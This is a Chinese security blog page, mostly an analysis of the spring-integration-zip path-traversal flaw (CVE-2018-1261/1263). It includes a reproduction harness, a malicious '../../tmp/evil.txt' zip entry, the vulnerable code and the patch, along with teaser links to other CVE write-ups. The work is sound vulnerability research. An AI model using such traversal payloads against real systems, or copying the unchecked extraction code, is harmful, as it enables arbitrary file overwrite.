<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbd119f2-67bd-1.png" alt="13.png"></p>
<p>Git在14年也爆过RCE洞(CVE-2014–9390)，其原理也是利用了目录穿越加覆盖配置文件，在checkout时进行RCE。具体可见参考链接。</p>
<p>有些地方可能没解释清楚或有不当的地方，欢迎留言讨论。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a></li>
<li><a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/" target="_blank" rel="external">Remediating the May 2018 Git Security Vulnerability</a></li>
<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E5%AD%90%E6%A8%A1%E5%9D%97" target="_blank" rel="external">Git 工具 - 子模块</a></li>
<li><a href="https://blog.github.com/2014-12-18-vulnerability-announced-update-your-git-clients/" target="_blank" rel="external">CVE-2014–9390</a></li>
<li><a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">atorralba：CVE-2018-11235 - Quick &amp; Dirty PoC</a></li>
</ul>

          
        
      
  </div>
      <div>
      
    </div>
	<div>
      
	</div>
    <div>
      
    </div>




    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-分析-【CVE-2018-1261-与-CVE-2018-1263】/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-分析-【CVE-2018-1261-与-CVE-2018-1263】/" itemprop="url">
                  Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-14T07:37:38+08:00">
                2018-05-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-分析-【CVE-2018-1261-与-CVE-2018-1263】/" class="leancloud_visitors" data-flag-title="Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="https://xz.aliyun.com/t/2334" target="_blank" rel="external">Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】</a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://pivotal.io/security/cve-2018-1261" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1261</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/1.png?raw=true" alt=""></p>
<p>关于 CVE-2018-1263 ，见<a href="https://xz.aliyun.com/t/2334#toc-2" target="_blank" rel="external">补丁浅析</a>部分。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/2.gif?raw=true" alt=""></p>
<p>从简单的测试代码开始：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> ResourceLoader resourceLoader = <span class="keyword">new</span> DefaultResourceLoader();</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> File path =  <span class="keyword">new</span> File(<span class="string">"./here/"</span>);</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String... args)</span> </span>&#123;</div><div class="line">		<span class="keyword">final</span> Resource evilResource = resourceLoader.getResource(<span class="string">"classpath:zip-malicious-traversal.zip"</span>);</div><div class="line">		<span class="keyword">try</span>&#123;</div><div class="line">			InputStream evilIS = evilResource.getInputStream();</div><div class="line">			Message&lt;InputStream&gt; evilMessage = MessageBuilder.withPayload(evilIS).build();</div><div class="line">			UnZipTransformer unZipTransformer = <span class="keyword">new</span> UnZipTransformer();</div><div class="line">			unZipTransformer.setWorkDirectory(path);</div><div class="line">			unZipTransformer.afterPropertiesSet();</div><div class="line">			unZipTransformer.transform(evilMessage);</div><div class="line">		&#125;<span class="keyword">catch</span> (Exception e)&#123;</div><div class="line">			System.out.println(e);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中<code>zip-malicious-traversal.zip</code>即恶意的压缩包，结构如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/2.png?raw=true" alt=""></p>
<p><code>unZipTransformer.setWorkDirectory(path);</code>设置了正常情况下解压目录为当前目录下的here文件夹，如上gif所示，在here文件夹中生成了good.txt。而evil.txt却逃逸出了这个限制，在G://tmp下生成了。</p>
<p>环境相关源码见附件。为了复现漏洞，需要在硬盘根目录下先创建一个tmp目录，<code>zip-malicious-traversal.zip</code>在CVE-2018-1261\src\main\resources中。</p>
<p>跟踪代码，在<code>unZipTransformer.transform(evilMessage);</code>处打上断点跟入。当控制流到达 org/springframework/integration/zip/transformer/UnZipTransformer.java:112<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZipUtil.iterate(inputStream, <span class="keyword">new</span> ZipEntryCallback() &#123; ... &#125;);</div></pre></td></tr></table></figure></p>
<p>这里会将inputStream输入，<code>ZipEntryCallback</code>作为回调函数。跟入<code>iterate</code> 至org/zeroturnaround/zip/ZipUtil.java。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">iterate</span><span class="params">(InputStream is, ZipEntryCallback action, Charset charset)</span> </span>&#123;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    ZipInputStream in = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</div><div class="line">        in = <span class="keyword">new</span> ZipInputStream(<span class="keyword">new</span> BufferedInputStream(is));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123; ... &#125;</div><div class="line">    ZipEntry entry;</div><div class="line">    <span class="keyword">while</span> ((entry = in.getNextEntry()) != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">        action.process(in, entry);</div><div class="line">      &#125;</div><div class="line">      ...</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在iterate中，通过<code>in = new ZipInputStream(new BufferedInputStream(is));</code>生成了ZipInputStream对象<code>in</code>，此后通过<code>in.getNextEntry()</code>来获取对象in中的一个个条目。对于<code>getNextEntry()</code>而已，它会直接把目录给打印出来，具体可以参见<a href="https://stackoverflow.com/questions/11784102/how-does-zipinputstream-getnextentry-work" target="_blank" rel="external">stackoverflow: How does ZipInputStream.getNextEntry() work?</a>。所以对于<code>zip-malicious-traversal.zip</code>而言</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/4.png?raw=true" alt=""></p>
<p>回到UnZipTransformer.java：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/3.png?raw=true" alt=""></p>
<p>可以看到<code>entry</code>的值即为<code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/evil.txt</code>。</p>
<p>此后调用回调函数process:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(InputStream zipEntryInputStream, ZipEntry zipEntry)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">final</span> String zipEntryName = zipEntry.getName();</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> (ZipResultType.FILE.equals(zipResultType)) &#123;</div><div class="line">        <span class="keyword">final</span> File tempDir = <span class="keyword">new</span> File(workDirectory, message.getHeaders().getId().toString());</div><div class="line">        tempDir.mkdirs(); <span class="comment">//NOSONAR false positive</span></div><div class="line">        <span class="keyword">final</span> File destinationFile = <span class="keyword">new</span> File(tempDir, zipEntryName);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (zipEntry.isDirectory()) &#123; ...   &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            SpringZipUtils.copy(zipEntryInputStream, destinationFile);</div><div class="line">            uncompressedData.put(zipEntryName, destinationFile);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>tempDir</code>是临时生成的文件夹，而<code>zipEntryName</code>通过<code>zipEntry.getName()</code>得到，即为<code>../../../</code>那一串。接着通过<code>final File destinationFile = new File(tempDir, zipEntryName);</code>确定解压目录，也正是这里造成了跨越目录漏洞。接着就是调用<code>copy</code>把数据写到destinationFile处。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/5.png?raw=true" alt=""></p>
<p>究其原因，对于getNextEntry而言,<code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp</code>仅仅是目录名字，而对于copy操作而言，<code>../../../</code>等将被解释为目录穿越操作从而造成了任意解压。</p>
<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>1.0.1.RELEASE中的补丁 <a href="https://github.com/spring-projects/spring-integration-extensions/commit/a5573eb232ff85199ff9bb28993df715d9a19a25" target="_blank" rel="external">Disallow traversal entity in zip</a>，主要是在进行copy操作前，对zipEntryName进行了检查<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span> (zipEntryName.contains(<span class="string">".."</span>) &amp;&amp; !destinationFile.getCanonicalPath().startsWith(workDirectory.getCanonicalPath())) &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ZipException(<span class="string">"The file "</span> + zipEntryName + <span class="string">" is trying to leave the target output directory of "</span> + workDirectory);</div><div class="line">    &#125;</div><div class="line">```           </div><div class="line"></div><div class="line">对于恶意的压缩包，假设`destinationFile`值为`.\here\e401f4b8-<span class="number">0</span>ecb-<span class="number">3f</span>3a-<span class="number">76</span>ce-<span class="number">5318</span>b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。</div><div class="line"></div><div class="line">对于恶意的压缩包，在生成了`destinationFile`后，假设值为`.\here\e401f4b8-<span class="number">0</span>ecb-<span class="number">3f</span>3a-<span class="number">76</span>ce-<span class="number">5318</span>b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。</div><div class="line"></div><div class="line">之后，<span class="number">2018</span>年<span class="number">5</span>月<span class="number">11</span>日pivotal又再次放出公告：</div><div class="line">![<span class="number">11</span>.png](https:<span class="comment">//github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/11.png?raw=true)</span></div><div class="line"></div><div class="line">原因在于：</div></pre></td></tr></table></figure></p>
<p>While the framework itself now does not write such files, it does present the errant path to the user application, which could inadvertently write the file using that path.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">也就是说，生成的`destinationFile`其实是错误的，尽管框架本身不会有问题不会出现目录遍历漏洞，但是对于应用而言，可能之后直接使用了`destinationFile`这个路径来进行操作从而导致错误。因此在1.0.2.RELEASE版本中的补丁中[[Dissallow traversal entry even for byte[]](https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b)，直接在生成`destinationFile`时做了检查：</div><div class="line"></div><div class="line">```java </div><div class="line">final File destinationFile = checkPath(message, zipEntryName);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/7.png?raw=true" alt="7.png"></p>
<p>除此之外，在 <a href="https://github.com/spring-projects/spring-integration-extensions/commit/8d1752cb98f40abe521cc35884efe68c577b64eb" target="_blank" rel="external">Remove unnecessary check for the <code>..</code></a>中还将<code>zipEntryName.contains(&quot;..&quot;)</code>的判断删除，因为认为是不必要的。</p>
<h1 id="漏洞考古"><a href="#漏洞考古" class="headerlink" title="漏洞考古"></a>漏洞考古</h1><p>类似的压缩文件目录遍历漏洞以前也出现不少，列举几个。</p>
<ul>
<li><a href="https://www.nowsecure.com/blog/2015/06/16/remote-code-execution-as-system-user-on-samsung-phones/" target="_blank" rel="external">安卓：三星默认输入法远程代码执行</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/8.png?raw=true" alt=""></li>
<li><a href="https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution" target="_blank" rel="external">Python：Exploiting insecure file extraction in Python for code execution</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/9.png?raw=true" alt=""></li>
<li><a href="http://blog.knownsec.com/2016/11/gnu-tar-extract-pathname-bypass-cve-2016-6321/" target="_blank" rel="external">GNU tar 解压路径绕过漏洞</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/10.png?raw=true" alt=""></li>
</ul>

          
        
      
  </div>
      <div>
      
    </div>
	<div>
      
	</div>
    <div>
      
    </div>




    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/05/12/RCE-with-spring-security-oauth2-分析-【CVE-2018-1260】/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/12/RCE-with-spring-security-oauth2-分析-【CVE-2018-1260】/" itemprop="url">
                  RCE with spring-security-oauth2 分析-【CVE-2018-1260】
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-12T07:30:38+08:00">
                2018-05-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2018/05/12/RCE-with-spring-security-oauth2-分析-【CVE-2018-1260】/" class="leancloud_visitors" data-flag-title="RCE with spring-security-oauth2 分析-【CVE-2018-1260】">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><a href="https://xz.aliyun.com/t/2330">RCE with spring-security-oauth2 分析-【CVE-2018-1260】</a><br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2018/05/12/RCE-with-spring-security-oauth2-分析-【CVE-2018-1260】/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
  </div>
      <div>
      
    </div>
	<div>
      
	</div>
    <div>
      
    </div>




    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/05/08/【struts2-命令-代码执行漏洞分析系列】S2-003和S3-005/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/08/【struts2-命令-代码执行漏洞分析系列】S2-003和S3-005/" itemprop="url">
                  【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-08T07:45:08+08:00">
                2018-05-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2018/05/08/【struts2-命令-代码执行漏洞分析系列】S2-003和S3-005/" class="leancloud_visitors" data-flag-title="【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><a href="https://xz.aliyun.com/t/2323">阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</a><br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2018/05/08/【struts2-命令-代码执行漏洞分析系列】S2-003和S3-005/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
  </div>
      <div>
      
    </div>
	<div>
      
	</div>
    <div>
      
    </div>




    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/" itemprop="url">
                  GitList 0.6 Unauthenticated RCE 分析
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-30T12:25:26+08:00">
                2018-04-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/" class="leancloud_visitors" data-flag-title="GitList 0.6 Unauthenticated RCE 分析">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>GitList 0.6 Unauthenticated RCE 分析<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
  </div>
      <div>
      
    </div>
	<div>
      
	</div>
    <div>
      
    </div>




    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/" itemprop="url">
                  Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-11T23:35:54+08:00">
                2018-04-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/" class="leancloud_visitors" data-flag-title="Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><a href="https://xz.aliyun.com/t/2269">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a><br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
  </div>
      <div>
      
    </div>
	<div>
      
	</div>
    <div>
      
    </div>




    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/04/10/Thinkphp框架-5-0-16-sql注入漏洞分析/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/10/Thinkphp框架-5-0-16-sql注入漏洞分析/" itemprop="url">
                  Thinkphp框架 < 5.0.16 sql注入漏洞分析
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-10T07:22:49+08:00">
                2018-04-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web Security</span>
                  </a>
                </span>

                
